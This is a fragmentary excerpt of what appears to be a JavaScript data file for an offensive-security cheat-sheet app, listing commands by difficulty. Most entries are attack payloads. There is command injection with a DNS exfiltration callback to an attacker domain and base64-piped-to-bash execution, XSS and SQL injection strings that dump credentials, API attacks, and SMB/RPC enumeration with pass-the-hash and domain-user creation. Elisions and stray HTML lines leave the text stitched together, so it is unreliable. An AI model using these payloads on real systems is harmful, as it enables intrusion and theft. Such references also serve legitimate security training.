...
:: Progress: [4619/4619] :: Errors: 0 ::'
  ...
  },
  {
    id: 'seq',
    emoji: '\u{1F522}',
    title: 'Linux — seq (Number Sequence Generator)',
    commands: [
      { title: 'seq — Basic', desc: 'Numbers 1 to N', diff: 'easy', code: 'seq <count>' },
      { title: 'seq — Start to end', desc: 'Custom range', diff: 'easy', code: 'seq <start> <end>' },
      { title: 'seq — Step increment', desc: 'Custom step value', diff: 'easy', code: 'seq <start> <step> <end>' },
      { title: 'seq — Reverse', desc: 'Count backwards', diff: 'easy', code: 'seq <start> -1 <end>' },
      { title: 'seq — Floating point', desc: 'Decimal step values', diff: 'medium', code: 'seq 0 0.5 2' },
      { title: 'seq — Custom format', desc: 'Format with leading zeros', diff: 'medium', code: 'seq -f "ID-%03g" 1 5' },
      { title: 'seq — Equal width', desc: 'Pad numbers to same width', diff: 'easy', code: 'seq -w 1 10' },
      { title: 'seq — Custom separator', desc: 'Comma or other delimiter', diff: 'medium', code: 'seq -s ", " 1 5' },
      { title: 'seq — Hex output', desc: 'Generate hexadecimal values', diff: 'medium', code: 'seq -f "0x%X" 1 5' },
      { title: 'seq — Generate usernames', desc: 'user1, user2, user3...', diff: 'medium', code: 'seq -f "user%g" 1 5' },
      { title: 'seq — Generate IPs', desc: 'IP range from sequence', diff: 'medium', code: 'seq -f "192.168.1.%g" 1 5' },
      { title: 'seq — With xargs', desc: 'Pipe sequence to xargs', diff: 'medium', code: 'seq 1 5 | xargs -I{} echo Host-{}' },
    ]
  },
  {
    id: 'web',
...
<html><head><title>Site</title></head><body>...</body></html>'
  ...
  },
  {
    ...
    commands: [
      { title: 'CMDI — Basic test', desc: 'Execute whoami via param', diff: 'medium', code: '<url>?cmd=whoami' },
      { title: 'CMDI — Semicolon sep', desc: 'Chain commands with ;', diff: 'medium', code: '<param>; id' },
      { title: 'CMDI — AND operator', desc: 'Run if first succeeds (&&)', diff: 'medium', code: '<param> && whoami' },
      { title: 'CMDI — OR operator', desc: 'Run if first fails (||)', diff: 'medium', code: '<param> || whoami' },
      { title: 'CMDI — Pipe', desc: 'Pipe output to another command', diff: 'medium', code: '<param> | whoami' },
      { title: 'CMDI — Backticks', desc: 'Execute inside backticks', diff: 'hard', code: '<param>`whoami`' },
      { title: 'CMDI — Subshell $()', desc: 'Command substitution', diff: 'hard', code: '<param>$(whoami)' },
      { title: 'CMDI — Newline encoded', desc: 'URL-encoded newline injection', diff: 'hard', code: '<param>%0Aid' },
      { title: 'CMDI — Time delay Linux', desc: 'Blind detection via sleep', diff: 'medium', code: '<param> | sleep 5' },
      { title: 'CMDI — Time delay Windows', desc: 'Blind detection via timeout', diff: 'medium', code: '<param> | timeout /T 5' },
      { title: 'CMDI — DNS exfil', desc: 'Outbound DNS callback', diff: 'hard', code: '<param> | nslookup <attacker_domain>' },
      { title: 'CMDI — Ping callback', desc: 'ICMP callback detection', diff: 'hard', code: '<param> | ping -c 4 <attacker_ip>' },
      { title: 'CMDI — Space bypass IFS', desc: 'Bypass space filters with ${IFS}', diff: 'hard', code: 'cat${IFS}/etc/passwd' },
      { title: 'CMDI — Tab bypass', desc: 'Use tab instead of space', diff: 'hard', code: 'cat%09/etc/passwd' },
      { title: 'CMDI — Blind write output', desc: 'Redirect output to readable file', diff: 'hard', code: '<param> > /var/www/html/<output>' },
      { title: 'CMDI — WAF bypass quotes', desc: 'Break signatures with quotes', diff: 'hard', code: "w'h'o'am'i" },
      { title: 'CMDI — Base64 payload', desc: 'Encoded command execution', diff: 'hard', code: 'echo <base64> | base64 -d | bash' },
    ]
  },
  {
    id: 'xss',
    ...
    commands: [
      { title: 'XSS — Reflected', desc: 'Payload in URL reflected in response', diff: 'medium', code: '<script>alert(1)</script>' },
      { title: 'XSS — Stored', desc: 'Persistent via comments/profiles', diff: 'hard', code: '<img src=x onerror=alert(1)>' },
      { title: 'XSS — DOM-based', desc: 'Client-side JS sink injection', diff: 'hard', code: '#<script>alert(1)</script>' },
      { title: 'XSS — Script tag', desc: 'Basic script execution', diff: 'easy', code: '<script>alert(\'XSS\')</script>' },
      { title: 'XSS — Event handler', desc: 'Onclick/onerror attribute injection', diff: 'medium', code: '<div onclick=alert(1)>Click</div>' },
      { title: 'XSS — Image onerror', desc: 'Image tag with error handler', diff: 'medium', code: '<img src=x onerror=alert(1)>' },
      { title: 'XSS — SVG onload', desc: 'SVG vector for modern browsers', diff: 'medium', code: '<svg onload=alert(1)>' },
      { title: 'XSS — JS URI', desc: 'javascript: pseudo-protocol', diff: 'medium', code: '<a href="javascript:alert(1)">Click</a>' },
      { title: 'XSS — Filter bypass', desc: 'Break out of filtered tags', diff: 'hard', code: '<scr<script>ipt>alert(1)</script>' },
    ]
  },
  {
    id: 'sqli-ref',
    emoji: '\u{1F50E}',
    title: 'Web — SQL Injection Reference',
    commands: [
      { title: 'SQLi — Basic detect', desc: 'Trigger SQL error with quote', diff: 'easy', code: "'"},
      { title: 'SQLi — Always true', desc: 'Bypass auth with OR 1=1', diff: 'medium', code: "' OR 1=1 --"},
      { title: 'SQLi — Column count', desc: 'Find column count via ORDER BY', diff: 'hard', code: "' ORDER BY 1 --"},
      { title: 'SQLi — UNION null', desc: 'Match column count with NULLs', diff: 'hard', code: "' UNION SELECT NULL,NULL --"},
      { title: 'SQLi — Extract data', desc: 'Dump data via UNION SELECT', diff: 'hard', code: "' UNION SELECT user,pass FROM users --"},
      { title: 'SQLi — Error-based', desc: 'Extract DB via error message', diff: 'hard', code: "' AND 1=CONVERT(int,@@version) --"},
      { title: 'SQLi — Blind boolean', desc: 'Compare true vs false conditions', diff: 'hard', code: "' AND 1=1 -- / ' AND 1=2 --"},
      { title: 'SQLi — Blind time (MySQL)', desc: 'Time-based detection via SLEEP', diff: 'hard', code: "' AND SLEEP(5) --"},
      { title: 'SQLi — Blind time (PgSQL)', desc: 'Time-based via pg_sleep', diff: 'hard', code: "' AND pg_sleep(5) --"},
      { title: 'SQLi — Blind time (MSSQL)', desc: 'Time-based via WAITFOR', diff: 'hard', code: "' WAITFOR DELAY '0:0:5' --"},
    ]
  },
  {
    id: 'api-attack',
    emoji: '\u{1F4E6}',
    title: 'Web — API Attack Techniques',
    commands: [
      { title: 'API — BOLA/IDOR', desc: 'Access other users objects by ID', diff: 'hard', code: 'GET /api/user/123 -> /api/user/124' },
      { title: 'API — JWT alg none', desc: 'Tamper JWT with alg: none', diff: 'hard', code: '{"alg":"none","role":"admin"}' },
      { title: 'API — Mass assignment', desc: 'Over-post hidden fields', diff: 'hard', code: 'POST {"role":"admin"}' },
      { title: 'API — SSRF', desc: 'Make server request internal resource', diff: 'hard', code: 'url=http://127.0.0.1:80' },
      { title: 'API — CORS misconfig', desc: 'Bypass with arbitrary origin', diff: 'medium', code: 'Origin: evil.com' },
      { title: 'API — Rate limit bypass', desc: 'Rotate IP/UA to brute force', diff: 'hard', code: 'Rotate User-Agent + X-Forwarded-For' },
      { title: 'API — GraphQL introspection', desc: 'Dump schema via introspection', diff: 'hard', code: '{ __schema { types { name } } }' },
      { title: 'API — Pagination abuse', desc: 'Scrape via large page params', diff: 'medium', code: '?page=9999&limit=1000' },
      { title: 'API — Method tampering', desc: 'Switch GET to PUT/DELETE', diff: 'medium', code: 'GET -> PUT /api/resource' },
    ]
  },
  {
    id: 'burp',
    emoji: '\u{1F50E}',
    title: 'Web — Burp Suite',
    commands: [
      { title: 'burp — Launch GUI', desc: 'Start Burp Suite application', diff: 'easy', code: 'burpsuite' },
      { title: 'burp — CLI launch', desc: 'Start Burp from terminal', diff: 'medium', code: 'java -jar burpsuite_pro.jar' },
      { title: 'burp — Proxy config', desc: 'Browser proxy address', diff: 'easy', code: '127.0.0.1:8080' },
      { title: 'burp — Intercept toggle', desc: 'Pause/forward HTTP traffic', diff: 'easy', code: 'Proxy -> Intercept -> Intercept is on' },
      { title: 'burp — Forward request', desc: 'Send intercepted request to server', diff: 'easy', code: 'Forward' },
      { title: 'burp — Drop request', desc: 'Discard intercepted request', diff: 'easy', code: 'Drop' },
      { title: 'burp — HTTP history', desc: 'View all captured requests', diff: 'easy', code: 'Proxy -> HTTP history' },
      { title: 'burp — Add to scope', desc: 'Restrict testing to target', diff: 'medium', code: 'Target -> Scope -> Add' },
      { title: 'burp — Send to Repeater', desc: 'Modify and replay request', diff: 'medium', code: 'Right Click -> Send to Repeater' },
      { title: 'burp — Send to Intruder', desc: 'Automated payload attack', diff: 'hard', code: 'Right Click -> Send to Intruder' },
      { title: 'burp — Intruder sniper', desc: 'One payload position at a time', diff: 'hard', code: 'Attack Type: Sniper' },
      { title: 'burp — Intruder cluster bomb', desc: 'Multiple payload combos', diff: 'hard', code: 'Attack Type: Cluster Bomb' },
      { title: 'burp — URL encoder', desc: 'Encode data as URL', diff: 'easy', code: 'Decoder -> Encode as URL' },
      { title: 'burp — Base64 decoder', desc: 'Decode Base64 strings', diff: 'easy', code: 'Decoder -> Decode as Base64' },
      { title: 'burp — Sequencer', desc: 'Analyze token randomness', diff: 'hard', code: 'Send to Sequencer' },
      { title: 'burp — CSRF PoC', desc: 'Generate HTML CSRF exploit', diff: 'hard', code: 'Engagement tools -> Generate CSRF PoC' },
      { title: 'burp — Install CA cert', desc: 'Enable HTTPS interception', diff: 'medium', code: 'http://burp/cert' },
      { title: 'burp — Collaborator', desc: 'Detect out-of-band interactions', diff: 'hard', code: 'Burp Collaborator client' },
      { title: 'burp — BApp Store', desc: 'Install community extensions', diff: 'medium', code: 'Extender -> BApp Store' },
...
<html><head><title>Site</title></head><body>...</body></html>'
  ...
  },
  {
    ...
    commands: [
      ...
      { title: 'smbclient — List shares', desc: 'Anonymous share enumeration', diff: 'easy', code: 'smbclient -L //<target> -N' },
      { title: 'smbclient — List with auth', desc: 'List shares with credentials', diff: 'easy', code: 'smbclient -L //<target> -U <user>' },
      { title: 'smbclient — Connect share', desc: 'Interactive SMB shell', diff: 'medium', code: 'smbclient //<target>/<share> -U <user>' },
      { title: 'smbclient — Null session', desc: 'Connect without credentials', diff: 'medium', code: 'smbclient //<target>/<share> -N' },
      { title: 'smbclient — Execute command', desc: 'Run single SMB command', diff: 'hard', code: 'smbclient //<target>/<share> -U <user> -c \'<command>\'' },
      { title: 'smbclient — Download file', desc: 'Get file from share', diff: 'hard', code: 'smbclient //<target>/<share> -U <user> -c \'get <remote> <local>\'' },
      { title: 'smbclient — Upload file', desc: 'Put file onto share', diff: 'hard', code: 'smbclient //<target>/<share> -U <user> -c \'put <local> <remote>\'' },
      { title: 'smbclient — Recursive download', desc: 'Download all files', diff: 'hard', code: 'smbclient //<target>/<share> -U <user> -c \'recurse ON; prompt OFF; mget *\'' },
      { title: 'smbclient — Create tar', desc: 'Archive share to tar file', diff: 'hard', code: 'smbclient //<target>/<share> -U <user> -Tc <archive> *' },
      { title: 'smbclient — Extract tar', desc: 'Restore tar to share', diff: 'hard', code: 'smbclient //<target>/<share> -U <user> -Tx <archive>' },
      { title: 'smbclient — Password inline', desc: 'Pass password in command', diff: 'medium', code: 'smbclient //<target>/<share> -U <user>%<pass>' },
      { title: 'smbclient — Domain auth', desc: 'Authenticate with domain', diff: 'hard', code: 'smbclient //<target>/<share> -U <domain>/<user>' },
      { title: 'smbclient — Pass-the-hash', desc: 'Authenticate with NT hash', diff: 'hard', code: 'smbclient //<target>/<share> -U <user> --pw-nt-hash <hash>' },
      { title: 'smbclient — Kerberos auth', desc: 'Use Kerberos ticket', diff: 'hard', code: 'smbclient //<target>/<share> -k' },
      { title: 'smbclient — Max protocol', desc: 'Force SMB version', diff: 'hard', code: 'smbclient //<target>/<share> -U <user> --max-protocol=<version>' },
      { title: 'smbclient — Custom port', desc: 'Connect on non-default port', diff: 'medium', code: 'smbclient //<target>/<share> -U <user> -p <port>' },
      { title: 'smbclient — Debug level', desc: 'Verbose debug output', diff: 'medium', code: 'smbclient //<target>/<share> -U <user> -d <level>' },
      { title: 'smbclient — Send message', desc: 'WinPopUp message to host', diff: 'medium', code: 'smbclient -M <target>' },
      { title: 'rpcclient — Null session', desc: 'Connect anonymously', diff: 'hard', code: 'rpcclient -U "" -N <target>' },
      { title: 'rpcclient — Auth connect', desc: 'Connect with credentials', diff: 'hard', code: 'rpcclient -U <user> <target>' },
      { title: 'rpcclient — Enum users', desc: 'List domain users', diff: 'hard', code: 'rpcclient -U "" -N <target> -c "enumdomusers"' },
      { title: 'rpcclient — Enum groups', desc: 'List domain groups', diff: 'hard', code: 'rpcclient -U "" -N <target> -c "enumdomgroups"' },
      { title: 'rpcclient — Query user', desc: 'Get user details by RID', diff: 'hard', code: 'rpcclient -U "" -N <target> -c "queryuser <rid>"' },
      { title: 'rpcclient — Query group', desc: 'Get group details by RID', diff: 'hard', code: 'rpcclient -U "" -N <target> -c "querygroup <rid>"' },
      { title: 'rpcclient — Group members', desc: 'List members of group by RID', diff: 'hard', code: 'rpcclient -U "" -N <target> -c "querygroupmem <rid>"' },
      { title: 'rpcclient — Enum shares', desc: 'List all network shares', diff: 'hard', code: 'rpcclient -U "" -N <target> -c "netshareenumall"' },
      { title: 'rpcclient — Password policy', desc: 'Get domain password policy', diff: 'hard', code: 'rpcclient -U "" -N <target> -c "getdompwinfo"' },
      { title: 'rpcclient — Lookup SID', desc: 'Resolve SID to name', diff: 'hard', code: 'rpcclient -U "" -N <target> -c "lookupsids <sid>"' },
      { title: 'rpcclient — Lookup name', desc: 'Convert username to SID', diff: 'hard', code: 'rpcclient -U "" -N <target> -c "lookupnames <user>"' },
      { title: 'rpcclient — Domain info', desc: 'Show domain details', diff: 'hard', code: 'rpcclient -U "" -N <target> -c "querydominfo"' },
      { title: 'rpcclient — Server info', desc: 'Get server version/OS info', diff: 'hard', code: 'rpcclient -U "" -N <target> -c "srvinfo"' },
      { title: 'rpcclient — Enum trusts', desc: 'List domain trusts', diff: 'hard', code: 'rpcclient -U "" -N <target> -c "enumtrust"' },
      { title: 'rpcclient — Enum printers', desc: 'List printers on target', diff: 'hard', code: 'rpcclient -U "" -N <target> -c "enumprinters"' },
      { title: 'rpcclient — Enumerate privileges', desc: 'List system privileges', diff: 'hard', code: 'rpcclient -U "" -N <target> -c "enumprivs"' },
      { title: 'rpcclient — Display info', desc: 'User display information', diff: 'hard', code: 'rpcclient -U "" -N <target> -c "querydispinfo"' },
      { title: 'rpcclient — Enum aliases', desc: 'List local builtin groups', diff: 'hard', code: 'rpcclient -U "" -N <target> -c "enumalsgroups builtin"' },
      { title: 'rpcclient — Alias members', desc: 'List members of local group', diff: 'hard', code: 'rpcclient -U "" -N <target> -c "queryaliasmem builtin <rid>"' },
      { title: 'rpcclient — Create user', desc: 'Create new domain user', diff: 'hard', code: 'rpcclient -U <admin> <target> -c "createdomuser <user>"' },
      { title: 'rpcclient — Delete user', desc: 'Delete domain user', diff: 'hard', code: 'rpcclient -U <admin> <target> -c "deletedomuser <user>"' },
